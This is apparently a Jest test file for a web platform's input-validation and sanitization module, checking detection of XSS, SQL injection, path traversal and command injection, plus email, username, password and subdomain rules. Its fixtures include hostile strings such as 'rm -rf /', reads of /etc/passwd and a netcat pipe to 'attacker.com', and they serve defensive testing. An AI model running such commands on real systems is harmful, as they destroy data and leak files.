/**
 * Tests for Platform Security Validation System
 */

import { 
  securityValidator, 
  validateInput, 
  sanitizeInput, 
  validateEmail, 
  validateUsername, 
  validatePasswordStrength,
  validateTenantName,
  validateSubdomain,
  SecurityThreatLevel,
  SECURITY_PATTERNS
} from '../security-validation';

describe('Platform Security Validation', () => {
  describe('XSS Protection', () => {
    test('should detect script tag injection', () => {
      const maliciousInput = '<script>alert("XSS")</script>';
      const result = validateInput(maliciousInput);
      
      expect(result.isValid).toBe(false);
      expect(result.threatLevel).toBe(SecurityThreatLevel.CRITICAL);
      expect(result.threats).toHaveLength(1);
      expect(result.threats[0].type).toBe('XSS_SCRIPT_INJECTION');
    });
    
    test('should detect javascript protocol injection', () => {
      const maliciousInput = 'javascript:alert("XSS")';
      const result = validateInput(maliciousInput);
      
      expect(result.isValid).toBe(false);
      expect(result.threatLevel).toBe(SecurityThreatLevel.HIGH);
      expect(result.threats[0].type).toBe('XSS_JAVASCRIPT_PROTOCOL');
    });
    
    test('should detect HTML event handler injection', () => {
      const maliciousInput = '<img onload="alert(1)" src="x">';
      const result = validateInput(maliciousInput);
      
      expect(result.isValid).toBe(false);
      expect(result.threatLevel).toBe(SecurityThreatLevel.HIGH);
      expect(result.threats.some(t => t.type === 'XSS_EVENT_HANDLER')).toBe(true);
    });
    
    test('should sanitize HTML content', () => {
      const htmlInput = '<p>Safe content</p><script>alert("bad")</script>';
      const sanitized = sanitizeInput(htmlInput, 'html');
      
      expect(sanitized).toContain('Safe content');
      expect(sanitized).not.toContain('<script>');
    });
  });
  
  describe('SQL Injection Protection', () => {
    test('should detect SQL injection attempts', () => {
      const sqlInjections = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'; SELECT * FROM users --"
      ];
      
      sqlInjections.forEach(injection => {
        const result = validateInput(injection);
        expect(result.isValid).toBe(false);
        expect(result.threatLevel).toBe(SecurityThreatLevel.CRITICAL);
        expect(result.threats[0].type).toBe('SQL_INJECTION');
      });
    });
    
    test('should allow safe content', () => {
      const safeContent = 'This is a normal sentence with numbers 123';
      const result = validateInput(safeContent);
      
      expect(result.isValid).toBe(true);
      expect(result.threatLevel).toBe(SecurityThreatLevel.LOW);
    });
  });
  
  describe('Path Traversal Protection', () => {
    test('should detect path traversal attempts', () => {
      const traversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32'
      ];
      
      traversalAttempts.forEach(attempt => {
        const result = validateInput(attempt);
        expect(result.isValid).toBe(false);
        expect(result.threatLevel).toBe(SecurityThreatLevel.HIGH);
        expect(result.threats[0].type).toBe('PATH_TRAVERSAL');
      });
    });
  });
  
  describe('Command Injection Protection', () => {
    test('should detect command injection attempts', () => {
      const commandInjections = [
        'test; rm -rf /',
        'test && cat /etc/passwd',
        'test | nc attacker.com 4444',
        'test $(whoami)'
      ];
      
      commandInjections.forEach(injection => {
        const result = validateInput(injection);
        expect(result.isValid).toBe(false);
        expect(result.threatLevel).toBe(SecurityThreatLevel.HIGH);
        expect(result.threats[0].type).toBe('COMMAND_INJECTION');
      });
    });
  });
  
  describe('Email Validation', () => {
    test('should validate correct email formats', () => {
      const validEmails = [
        'user@example.com',
        'test.email@domain.co.uk',
        'user+tag@example.org'
      ];
      
      validEmails.forEach(email => {
        expect(validateEmail(email)).toBe(true);
      });
    });
    
    test('should reject invalid email formats', () => {
      const invalidEmails = [
        'invalid-email',
        '@example.com',
        'user@',
        'user@.com'
      ];
      
      invalidEmails.forEach(email => {
        expect(validateEmail(email)).toBe(false);
      });
    });
  });
  
  describe('Username Validation', () => {
    test('should validate correct username formats', () => {
      const validUsernames = [
        'user123',
        'test_user',
        'user-name',
        'TestUser'
      ];
      
      validUsernames.forEach(username => {
        expect(validateUsername(username)).toBe(true);
      });
    });
    
    test('should reject invalid username formats', () => {
      const invalidUsernames = [
        'us',  // too short
        'user@domain',  // contains @
        'user space',  // contains space
        'a'.repeat(31)  // too long
      ];
      
      invalidUsernames.forEach(username => {
        expect(validateUsername(username)).toBe(false);
      });
    });
  });
  
  describe('Password Strength Validation', () => {
    test('should validate strong passwords', () => {
      const strongPasswords = [
        'Password123!',
        'MySecure@Pass1',
        'Test1234$'
      ];
      
      strongPasswords.forEach(password => {
        const result = validatePasswordStrength(password);
        expect(result.isStrong).toBe(true);
        expect(result.score).toBeGreaterThanOrEqual(4);
        expect(result.feedback).toHaveLength(0);
      });
    });
    
    test('should reject weak passwords', () => {
      const weakPasswords = [
        'password',  // no uppercase, number, special char
        'PASSWORD',  // no lowercase, number, special char
        'Pass1'     // too short
      ];
      
      weakPasswords.forEach(password => {
        const result = validatePasswordStrength(password);
        expect(result.isStrong).toBe(false);
        expect(result.score).toBeLessThan(4);
        expect(result.feedback.length).toBeGreaterThan(0);
      });
    });
  });
  
  describe('Tenant Name Validation', () => {
    test('should validate correct tenant names', () => {
      const validNames = [
        'Acme Corp',
        'Test-Company',
        'Company.Inc',
        'Enterprise Solutions',
        'Tech-Start.Up'
      ];
      
      validNames.forEach(name => {
        expect(validateTenantName(name)).toBe(true);
      });
    });
    
    test('should reject invalid tenant names', () => {
      const invalidNames = [
        'A',  // too short
        '-StartsDash',  // starts with dash
        'EndsSpace ',  // ends with space
        'Has@Symbol',  // contains @
        'a'.repeat(51)  // too long
      ];
      
      invalidNames.forEach(name => {
        expect(validateTenantName(name)).toBe(false);
      });
    });
  });
  
  describe('Subdomain Validation', () => {
    test('should validate correct subdomains', () => {
      const validSubdomains = [
        'acme',
        'test-company',
        'company123',
        'my-tenant',
        'subdomain1'
      ];
      
      validSubdomains.forEach(subdomain => {
        expect(validateSubdomain(subdomain)).toBe(true);
      });
    });
    
    test('should reject invalid subdomains', () => {
      const invalidSubdomains = [
        'a',  // too short
        '-starts-dash',  // starts with dash
        'ends-dash-',  // ends with dash
        'has_underscore',  // contains underscore
        'has.dot',  // contains dot
        'a'.repeat(64)  // too long
      ];
      
      invalidSubdomains.forEach(subdomain => {
        expect(validateSubdomain(subdomain)).toBe(false);
      });
    });
  });
  
  describe('Context-Specific Sanitization', () => {
    test('should sanitize username context', () => {
      const input = 'user@#$%name';
      const sanitized = sanitizeInput(input, 'username');
      expect(sanitized).toBe('username');
    });
    
    test('should sanitize email context', () => {
      const input = 'TEST@EXAMPLE.COM  ';
      const sanitized = sanitizeInput(input, 'email');
      expect(sanitized).toBe('test@example.com');
    });
    
    test('should sanitize tenant-name context', () => {
      const input = 'Acme Corp@#$%';
      const sanitized = sanitizeInput(input, 'tenant-name');
      expect(sanitized).toBe('Acme Corp');
    });
    
    test('should sanitize subdomain context', () => {
      const input = 'SUB@DOMAIN#$%';
      const sanitized = sanitizeInput(input, 'subdomain');
      expect(sanitized).toBe('subdomain');
    });
  });
  
  describe('Safe Content Validation', () => {
    test('should pass safe content without threats', () => {
      const safeInputs = [
        'This is a normal sentence.',
        'User input with numbers 123',
        'Valid email: user@example.com',
        'Normal text with punctuation!'
      ];
      
      safeInputs.forEach(input => {
        const result = validateInput(input);
        expect(result.isValid).toBe(true);
        expect(result.threatLevel).toBe(SecurityThreatLevel.LOW);
        expect(result.threats).toHaveLength(0);
      });
    });
  });
  
  describe('Security Patterns', () => {
    test('should have correct regex patterns', () => {
      expect(SECURITY_PATTERNS.EMAIL).toBeDefined();
      expect(SECURITY_PATTERNS.USERNAME).toBeDefined();
      expect(SECURITY_PATTERNS.PASSWORD_STRONG).toBeDefined();
      expect(SECURITY_PATTERNS.TENANT_NAME).toBeDefined();
      expect(SECURITY_PATTERNS.SUBDOMAIN).toBeDefined();
    });
    
    test('should match expected patterns', () => {
      expect(SECURITY_PATTERNS.EMAIL.test('user@example.com')).toBe(true);
      expect(SECURITY_PATTERNS.USERNAME.test('valid_user')).toBe(true);
      expect(SECURITY_PATTERNS.PASSWORD_STRONG.test('StrongP@ss1')).toBe(true);
      expect(SECURITY_PATTERNS.TENANT_NAME.test('Valid Company')).toBe(true);
      expect(SECURITY_PATTERNS.SUBDOMAIN.test('valid-subdomain')).toBe(true);
    });
  });
}); 